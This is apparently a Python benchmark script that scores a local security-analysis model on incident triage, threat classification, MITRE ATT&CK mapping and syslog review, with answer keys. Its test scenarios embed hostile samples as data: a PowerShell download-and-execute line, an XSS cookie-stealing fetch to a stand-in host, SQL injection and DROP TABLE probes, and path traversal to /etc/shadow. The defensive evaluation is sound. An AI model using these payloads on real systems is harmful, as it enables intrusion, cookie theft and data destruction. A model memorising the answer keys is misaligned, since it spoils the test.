"""
Foundation-Sec-8B-Instruct accuracy test.

Four sections:
  1. Incident recognition (binary: incident vs benign)
  2. Threat-type classification (multi-class)
  3. MITRE ATT&CK technique mapping (technique ID + name)
  4. Raw syslog triage (binary on real log-line snippets)

Each case has a known answer. We send the prompt to Ollama, parse the
response, and score it. Final report is written to results.md.
"""

import argparse
import json
import re
import sys
import time
import urllib.request

from drain3 import TemplateMiner
from drain3.template_miner_config import TemplateMinerConfig

OLLAMA_URL = "http://localhost:11434/api/generate"
OLLAMA_TAGS_URL = "http://localhost:11434/api/tags"
DEFAULT_MODEL = "hf.co/Mungert/Foundation-Sec-8B-Instruct-GGUF:Q4_K_M"

# Set by main() from --model. The ask() helper reads this at call time so the
# whole benchmark uses one consistent model without threading it through every
# function.
MODEL = DEFAULT_MODEL


def drain3_summary(log: str) -> str:
    """Cluster log lines into templates and return a `[xN] template` summary.

    Each snippet is mined in isolation so cluster counts reflect only that
    snippet — the model sees how many times each pattern repeats, which is
    the primary signal for brute-force / probe-style activity.
    """
    config = TemplateMinerConfig()
    config.profiling_enabled = False
    miner = TemplateMiner(config=config)
    for line in log.splitlines():
        line = line.strip()
        if line:
            miner.add_log_message(line)
    clusters = sorted(miner.drain.clusters, key=lambda c: -c.size)
    return "\n".join(f"[x{c.size}] {c.get_template()}" for c in clusters)

# ---------- Test cases ----------

INCIDENT_CASES = [
    {
        "id": "INC-1",
        "scenario": "User logs in from their normal office IP at 9:02am on a workday and opens email.",
        "expected": "benign",
    },
    {
        "id": "INC-2",
        "scenario": "Domain admin account authenticates successfully from an IP in a country the company has no offices in, at 03:14 local time, followed within 4 minutes by 18 RDP sessions to internal hosts.",
        "expected": "incident",
    },
    {
        "id": "INC-3",
        "scenario": "Web server logs show 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, with 3 successful logins to admin accounts.",
        "expected": "incident",
    },
    {
        "id": "INC-4",
        "scenario": "A scheduled nightly backup job runs at 02:00, copies 40GB to the backup server, and completes with exit code 0. Same as previous 30 nights.",
        "expected": "benign",
    },
    {
        "id": "INC-5",
        "scenario": "EDR alerts that powershell.exe spawned by winword.exe executed: IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')",
        "expected": "incident",
    },
    {
        "id": "INC-6",
        "scenario": "Developer pushes a commit to a feature branch, CI runs unit tests, all pass.",
        "expected": "benign",
    },
    {
        "id": "INC-7",
        "scenario": "DNS server logs show a single host querying 4,000+ unique subdomains of a single domain over 2 hours, with TXT record responses averaging 200 bytes.",
        "expected": "incident",
    },
]

THREAT_CASES = [
    {
        "id": "THR-1",
        "scenario": "Files on user workstations are renamed with .lockbit extension. A README.txt demands 2 BTC for decryption keys.",
        "expected_keywords": ["ransomware"],
    },
    {
        "id": "THR-2",
        "scenario": "Email appears to come from the CFO asking the AP clerk to wire $48,000 to a new vendor urgently. The reply-to address has a slight typo in the domain.",
        "expected_keywords": ["phishing", "bec", "business email compromise", "spear"],
    },
    {
        "id": "THR-3",
        "scenario": "Application logs show: SELECT * FROM users WHERE name='admin' OR '1'='1'-- in the username field of the login form.",
        "expected_keywords": ["sql injection", "sqli"],
    },
    {
        "id": "THR-4",
        "scenario": "A web app reflects a user-supplied 'name' query parameter directly into the HTML body without encoding. Attacker crafts a URL containing <script>fetch('//evil/'+document.cookie)</script>.",
        "expected_keywords": ["xss", "cross-site scripting", "cross site scripting"],
    },
    {
        "id": "THR-5",
        "scenario": "Internal user runs an executable received via email. The process injects into lsass.exe, dumps memory, and exfiltrates the dump over HTTPS to an external server.",
        "expected_keywords": ["credential", "credential dumping", "credential theft", "credential access", "lsass"],
    },
    {
        "id": "THR-6",
        "scenario": "Multiple hosts on the corporate network suddenly send 10Gbps of UDP traffic to the same external IP, sourced from spoofed addresses. The target is the company's public DNS.",
        "expected_keywords": ["ddos", "dos", "denial of service", "denial-of-service", "amplification"],
    },
    {
        "id": "THR-7",
        "scenario": "A signed update from a trusted third-party vendor's auto-update channel installs a backdoor on thousands of customer machines. The vendor's build server was compromised.",
        "expected_keywords": ["supply chain", "supply-chain"],
    },
]

# (id, scenario, expected technique IDs — any one match counts)
MITRE_CASES = [
    {
        "id": "ATT-1",
        "scenario": "An attacker sends a Word document containing a malicious macro to a target user. The user opens the doc and enables macros, which downloads a payload.",
        "expected_ids": ["T1566.001", "T1566", "T1204.002", "T1204"],
    },
    {
        "id": "ATT-2",
        "scenario": "Adversary uses Mimikatz to extract plaintext passwords and NTLM hashes from LSASS memory on a compromised host.",
        "expected_ids": ["T1003.001", "T1003"],
    },
    {
        "id": "ATT-3",
        "scenario": "Attacker creates a new scheduled task on the victim host to run their implant every time the system starts.",
        "expected_ids": ["T1053.005", "T1053"],
    },
    {
        "id": "ATT-4",
        "scenario": "After initial access, the attacker uses 'net group \"Domain Admins\" /domain' and 'nltest /dclist' to map the AD environment.",
        "expected_ids": ["T1087.002", "T1087", "T1018", "T1482"],
    },
    {
        "id": "ATT-5",
        "scenario": "Adversary establishes persistence by adding a value under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run that points to their malware.",
        "expected_ids": ["T1547.001", "T1547"],
    },
    {
        "id": "ATT-6",
        "scenario": "C2 beaconing traffic is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy.",
        "expected_ids": ["T1071.004", "T1071", "T1048.003", "T1048"],
    },
    {
        "id": "ATT-7",
        "scenario": "Attacker uses PsExec from a compromised workstation to execute a remote command on a domain controller using stolen admin credentials.",
        "expected_ids": ["T1021.002", "T1021", "T1570", "T1569.002"],
    },
    {
        "id": "ATT-8",
        "scenario": "Before encrypting victim files, the ransomware deletes Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet'.",
        "expected_ids": ["T1490"],
    },
    {
        "id": "ATT-9",
        "scenario": "A binary uses base64-encoded PowerShell with the -EncodedCommand flag to obscure its real payload from defenders.",
        "expected_ids": ["T1027", "T1059.001", "T1140"],
    },
    {
        "id": "ATT-10",
        "scenario": "Attacker compresses sensitive files into a password-protected RAR archive on the victim host before exfiltration.",
        "expected_ids": ["T1560.001", "T1560"],
    },
]


# Real-format syslog snippets (sshd, sudo, CRON, Apache access, winlogbeat).
# Each snippet is a verbatim multi-line excerpt as it would appear on disk.
SYSLOG_CASES = [
    {
        "id": "SYS-1",
        "label": "SSH brute force followed by successful login",
        "log": (
            "Mar 10 03:41:02 webhost sshd[28401]: Failed password for invalid user admin from 185.220.101.45 port 47812 ssh2\n"
            "Mar 10 03:41:05 webhost sshd[28403]: Failed password for invalid user root from 185.220.101.45 port 47815 ssh2\n"
            "Mar 10 03:41:08 webhost sshd[28405]: Failed password for invalid user oracle from 185.220.101.45 port 47820 ssh2\n"
            "Mar 10 03:41:11 webhost sshd[28407]: Failed password for invalid user postgres from 185.220.101.45 port 47824 ssh2\n"
            "Mar 10 03:41:14 webhost sshd[28409]: Failed password for invalid user git from 185.220.101.45 port 47829 ssh2\n"
            "Mar 10 03:41:17 webhost sshd[28411]: Failed password for invalid user test from 185.220.101.45 port 47833 ssh2\n"
            "Mar 10 03:41:20 webhost sshd[28413]: Failed password for ubuntu from 185.220.101.45 port 47837 ssh2\n"
            "Mar 10 03:43:21 webhost sshd[28571]: Accepted password for ubuntu from 185.220.101.45 port 47891 ssh2\n"
            "Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)\n"
        ),
        "expected": "incident",
    },
    {
        "id": "SYS-2",
        "label": "Normal pubkey login from internal range",
        "log": (
            "Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...\n"
            "Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)\n"
            "Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.\n"
        ),
        "expected": "benign",
    },
    {
        "id": "SYS-3",
        "label": "Daily cron run",
        "log": (
            "Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))\n"
            "Mar 10 02:00:23 webhost rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2102.0\"] rsyslogd was HUPed\n"
            "Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root\n"
        ),
        "expected": "benign",
    },
    {
        "id": "SYS-4",
        "label": "SQL injection probes in Apache access log",
        "log": (
            "185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] \"GET /products.php?id=1' OR '1'='1-- HTTP/1.1\" 500 1842\n"
            "185.62.190.13 - - [10/Mar/2026:14:22:04 +0000] \"GET /products.php?id=1+UNION+SELECT+username,password+FROM+users-- HTTP/1.1\" 200 4129\n"
            "185.62.190.13 - - [10/Mar/2026:14:22:05 +0000] \"GET /products.php?id=1;DROP+TABLE+users-- HTTP/1.1\" 500 1842\n"
            "185.62.190.13 - - [10/Mar/2026:14:22:06 +0000] \"GET /products.php?id=1+AND+SLEEP(5)-- HTTP/1.1\" 200 4129\n"
        ),
        "expected": "incident",
    },
    {
        "id": "SYS-5",
        "label": "Sudo adding service account to sudo group at 03:17",
        "log": (
            "Mar 10 03:17:42 webhost sudo:      bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup\n"
            "Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)\n"
            "Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'\n"
            "Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'\n"
            "Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root\n"
        ),
        "expected": "incident",
    },
    {
        "id": "SYS-6",
        "label": "Path traversal probes in Apache access log",
        "log": (
            "198.51.100.7 - - [10/Mar/2026:11:03:18 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 200 2841\n"
            "198.51.100.7 - - [10/Mar/2026:11:03:19 +0000] \"GET /download?file=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1\" 403 891\n"
            "198.51.100.7 - - [10/Mar/2026:11:03:20 +0000] \"GET /download?file=....//....//etc/hosts HTTP/1.1\" 200 412\n"
        ),
        "expected": "incident",
    },
    {
        "id": "SYS-7",
        "label": "Normal authenticated web session",
        "log": (
            "10.0.4.22 - alice [10/Mar/2026:10:14:02 +0000] \"GET /dashboard HTTP/1.1\" 200 18421 \"https://intranet.example.com/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\"\n"
            "10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] \"GET /static/app.js HTTP/1.1\" 200 84219 \"https://intranet.example.com/dashboard\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\"\n"
            "10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] \"POST /api/v1/metrics HTTP/1.1\" 200 142 \"https://intranet.example.com/dashboard\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\"\n"
        ),
        "expected": "benign",
    },
    {
        "id": "SYS-8",
        "label": "Windows 4625 burst then 4624 from same IP",
        "log": (
            "Mar 10 02:18:14 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04\n"
            "Mar 10 02:18:16 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04\n"
            "Mar 10 02:18:18 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04\n"
            "Mar 10 02:18:21 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04\n"
            "Mar 10 02:18:24 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04\n"
            "Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04\n"
        ),
        "expected": "incident",
    },
]


# ---------- Ollama call ----------

def ask(prompt: str, system: str = "", timeout: int = 180) -> str:
    body = json.dumps({
        "model": MODEL,
        "prompt": prompt,
        "system": system,
        "stream": False,
        "options": {"temperature": 0.0, "num_predict": 400},
    }).encode()
    req = urllib.request.Request(OLLAMA_URL, data=body, headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read())["response"].strip()


# ---------- Scoring ----------

def score_incident(reply: str, expected: str) -> bool:
    r = reply.lower()
    # Look at the first ~200 chars where the verdict is most likely stated.
    head = r[:300]
    if expected == "incident":
        positive = any(w in head for w in ["incident", "malicious", "suspicious", "compromise", "attack", "not benign"])
        negative = re.search(r"\bbenign\b|\bnot (an )?incident\b|\bnormal\b", head)
        return positive and not negative
    else:
        return ("benign" in head or "normal" in head or "not an incident" in head) and "incident" not in head.split("benign")[0] if "benign" in head else ("normal" in head or "not malicious" in head)


def score_threat(reply: str, keywords: list[str]) -> tuple[bool, str]:
    r = reply.lower()
    for kw in keywords:
        if kw in r:
            return True, kw
    return False, ""


def score_mitre(reply: str, expected_ids: list[str]) -> tuple[bool, str]:
    found = re.findall(r"T\d{4}(?:\.\d{3})?", reply)
    for f in found:
        if f in expected_ids:
            return True, f
    # also accept if any expected id appears as substring (model might write T1003.001)
    for eid in expected_ids:
        if eid in reply:
            return True, eid
    return False, ",".join(found) if found else "(none)"


# ---------- Run ----------

def list_installed_models() -> list[str]:
    """Return the list of model names currently pulled into the local Ollama."""
    with urllib.request.urlopen(OLLAMA_TAGS_URL, timeout=10) as r:
        data = json.loads(r.read())
    return [m["name"] for m in data.get("models", [])]


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Run the cybersecurity accuracy benchmark against an Ollama model.",
    )
    p.add_argument(
        "--model", "-m",
        default=DEFAULT_MODEL,
        help=f"Ollama model name to test (default: {DEFAULT_MODEL})",
    )
    p.add_argument(
        "--output", "-o",
        default="results.md",
        help="Output markdown file (default: results.md)",
    )
    p.add_argument(
        "--list", "-l",
        action="store_true",
        help="List installed Ollama models and exit.",
    )
    return p.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    global MODEL
    args = parse_args(argv if argv is not None else sys.argv[1:])

    if args.list:
        try:
            models = list_installed_models()
        except Exception as e:
            print(f"ERROR: could not reach Ollama at {OLLAMA_TAGS_URL}: {e}")
            return 1
        if not models:
            print("(no models installed — run `ollama pull <name>`)")
        else:
            print("Installed Ollama models:")
            for m in models:
                marker = " (default)" if m == DEFAULT_MODEL else ""
                print(f"  - {m}{marker}")
        return 0

    MODEL = args.model

    # Verify the chosen model is actually pulled, so failures fail fast with a
    # useful message instead of timing out per-case.
    try:
        installed = list_installed_models()
    except Exception as e:
        print(f"ERROR: could not reach Ollama at {OLLAMA_TAGS_URL}: {e}")
        return 1
    if MODEL not in installed:
        print(f"ERROR: model '{MODEL}' is not installed in Ollama.")
        print(f"Installed: {installed or '(none)'}")
        print(f"Pull it with: ollama pull {MODEL}")
        return 1

    print(f"Model:  {MODEL}")
    print(f"Output: {args.output}\n")

    out_lines = [f"# Cybersecurity benchmark — `{MODEL}`\n"]
    out_lines.append(f"Model: `{MODEL}`\n")
    out_lines.append(f"Run started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    sys_prompt = "You are a cybersecurity analyst. Answer concisely and decisively."

    # 1. Incident recognition
    out_lines.append("\n## 1. Incident recognition (binary)\n")
    inc_correct = 0
    for c in INCIDENT_CASES:
        prompt = (
            f"Scenario:\n{c['scenario']}\n\n"
            "Question: Is this a security incident or benign activity? "
            "Reply with one word first ('Incident' or 'Benign'), then one sentence of justification."
        )
        t0 = time.time()
        try:
            reply = ask(prompt, sys_prompt)
        except Exception as e:
            reply = f"ERROR: {e}"
        dt = time.time() - t0
        ok = score_incident(reply, c["expected"])
        inc_correct += int(ok)
        out_lines.append(
            f"\n### {c['id']} — expected: **{c['expected']}** — {'PASS' if ok else 'FAIL'} ({dt:.1f}s)\n"
            f"_Scenario_: {c['scenario']}\n\n"
            f"_Reply_: {reply}\n"
        )
        print(f"  {c['id']}: {'PASS' if ok else 'FAIL'} ({dt:.1f}s)")

    # 2. Threat classification
    out_lines.append(f"\n## 2. Threat-type classification\n")
    thr_correct = 0
    for c in THREAT_CASES:
        prompt = (
            f"Scenario:\n{c['scenario']}\n\n"
            "Question: Name the specific threat or attack type in 1-3 words, then briefly explain."
        )
        t0 = time.time()
        try:
            reply = ask(prompt, sys_prompt)
        except Exception as e:
            reply = f"ERROR: {e}"
        dt = time.time() - t0
        ok, hit = score_threat(reply, c["expected_keywords"])
        thr_correct += int(ok)
        out_lines.append(
            f"\n### {c['id']} — accepted keywords: {c['expected_keywords']} — {'PASS' if ok else 'FAIL'} ({dt:.1f}s)\n"
            f"_Scenario_: {c['scenario']}\n\n"
            f"_Reply_: {reply}\n"
            + (f"\n_Match_: '{hit}'\n" if ok else "")
        )
        print(f"  {c['id']}: {'PASS' if ok else 'FAIL'} ({dt:.1f}s)")

    # 3. MITRE mapping
    out_lines.append(f"\n## 3. MITRE ATT&CK technique mapping\n")
    att_correct = 0
    mitre_rows = []  # for the per-case summary table
    mitre_details = []
    for c in MITRE_CASES:
        prompt = (
            f"Scenario:\n{c['scenario']}\n\n"
            "Question: Which MITRE ATT&CK technique best matches this behavior? "
            "Reply with the technique ID (e.g. T1059.001) and the technique name."
        )
        t0 = time.time()
        try:
            reply = ask(prompt, sys_prompt)
        except Exception as e:
            reply = f"ERROR: {e}"
        dt = time.time() - t0
        ok, hit = score_mitre(reply, c["expected_ids"])
        att_correct += int(ok)

        # Short-form scenario for the summary table.
        short = c["scenario"] if len(c["scenario"]) <= 70 else c["scenario"][:67] + "..."
        # Escape pipes so markdown tables don't break.
        short = short.replace("|", "\\|")
        detected = hit.replace("|", "\\|") if hit else "(none)"
        mitre_rows.append(
            f"| {c['id']} | {short} | `{', '.join(c['expected_ids'])}` "
            f"| `{detected}` | {'PASS' if ok else 'FAIL'} |"
        )
        mitre_details.append(
            f"\n### {c['id']} — accepted IDs: {c['expected_ids']} — {'PASS' if ok else 'FAIL'} ({dt:.1f}s)\n"
            f"_Scenario_: {c['scenario']}\n\n"
            f"_Reply_: {reply}\n"
            f"\n_Detected IDs_: {hit}\n"
        )
        print(f"  {c['id']}: {'PASS' if ok else 'FAIL'} ({dt:.1f}s)")

    out_lines.append(
        "\n**Per-case results**\n\n"
        "| Case | Scenario | Accepted IDs | Detected | Result |\n"
        "|---|---|---|---|---|\n"
        + "\n".join(mitre_rows)
        + "\n"
    )
    out_lines.extend(mitre_details)

    # 4. Raw syslog triage — A/B: raw vs drain3-augmented prompt
    out_lines.append(f"\n## 4. Raw syslog triage (binary) — baseline vs drain3-augmented\n")
    sys_raw_correct = 0
    sys_drain_correct = 0
    for c in SYSLOG_CASES:
        # 4a. Baseline: raw logs only
        raw_prompt = (
            "You are reviewing raw log lines from a SIEM. Treat the text below as verbatim log output.\n\n"
            "Logs:\n"
            f"{c['log']}\n"
            "Question: Is this a security incident or benign activity? "
            "Reply with one word first ('Incident' or 'Benign'), then one sentence of justification."
        )
        t0 = time.time()
        try:
            raw_reply = ask(raw_prompt, sys_prompt)
        except Exception as e:
            raw_reply = f"ERROR: {e}"
        dt_raw = time.time() - t0
        ok_raw = score_incident(raw_reply, c["expected"])
        sys_raw_correct += int(ok_raw)

        # 4b. drain3-augmented: same logs + clustered template summary, with
        # explicit guidance on how to weight cluster counts.
        templates = drain3_summary(c["log"])
        aug_prompt = (
            "You are reviewing raw log lines from a SIEM. Treat the text below as verbatim log output.\n\n"
            "Logs:\n"
            f"{c['log']}\n"
            "Pattern summary from drain3 log clustering (one line per template, [xN] is the "
            "number of matching log lines, <*> marks variable fields):\n"
            f"{templates}\n\n"
            "How to read the pattern summary:\n"
            "- A high [xN] count on an attack-shaped template (e.g. failed logins, SQL/path-"
            "traversal probes, repeated auth failures) is strong evidence of an incident.\n"
            "- A small number of distinct templates with low counts that match routine activity "
            "(scheduled jobs, normal pubkey logins, ordinary HTTP 200s from internal users) is "
            "evidence of benign activity. Do NOT flag routine maintenance as an incident.\n\n"
            "Question: Is this a security incident or benign activity? Use the pattern summary "
            "as your primary signal. Reply with one word first ('Incident' or 'Benign'), then "
            "one sentence of justification that references the template counts."
        )
        t0 = time.time()
        try:
            aug_reply = ask(aug_prompt, sys_prompt)
        except Exception as e:
            aug_reply = f"ERROR: {e}"
        dt_aug = time.time() - t0
        ok_aug = score_incident(aug_reply, c["expected"])
        sys_drain_correct += int(ok_aug)

        out_lines.append(
            f"\n### {c['id']} — {c['label']} — expected: **{c['expected']}**\n"
            f"_Logs_:\n```\n{c['log']}```\n\n"
            f"_drain3 templates_:\n```\n{templates}\n```\n\n"
            f"**Baseline (raw only)** — {'PASS' if ok_raw else 'FAIL'} ({dt_raw:.1f}s)\n"
            f"_Reply_: {raw_reply}\n\n"
            f"**With drain3 summary** — {'PASS' if ok_aug else 'FAIL'} ({dt_aug:.1f}s)\n"
            f"_Reply_: {aug_reply}\n"
        )
        print(f"  {c['id']}: raw={'PASS' if ok_raw else 'FAIL'} drain3={'PASS' if ok_aug else 'FAIL'} ({dt_raw:.1f}s / {dt_aug:.1f}s)")

    # Summary — overall row uses the drain3-augmented syslog score.
    total = len(INCIDENT_CASES) + len(THREAT_CASES) + len(MITRE_CASES) + len(SYSLOG_CASES)
    correct = inc_correct + thr_correct + att_correct + sys_drain_correct
    n_sys = len(SYSLOG_CASES)
    summary = (
        "\n## Summary\n\n"
        f"| Section | Correct | Total | Accuracy |\n"
        f"|---|---|---|---|\n"
        f"| Incident recognition | {inc_correct} | {len(INCIDENT_CASES)} | {inc_correct/len(INCIDENT_CASES):.0%} |\n"
        f"| Threat classification | {thr_correct} | {len(THREAT_CASES)} | {thr_correct/len(THREAT_CASES):.0%} |\n"
        f"| MITRE ATT&CK mapping | {att_correct} | {len(MITRE_CASES)} | {att_correct/len(MITRE_CASES):.0%} |\n"
        f"| Syslog triage (raw) | {sys_raw_correct} | {n_sys} | {sys_raw_correct/n_sys:.0%} |\n"
        f"| Syslog triage (drain3) | {sys_drain_correct} | {n_sys} | {sys_drain_correct/n_sys:.0%} |\n"
        f"| **Overall (with drain3)** | **{correct}** | **{total}** | **{correct/total:.0%}** |\n"
    )
    out_lines.insert(3, summary)
    print(summary)

    with open(args.output, "w") as f:
        f.write("".join(out_lines))
    print(f"\nWrote {args.output}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
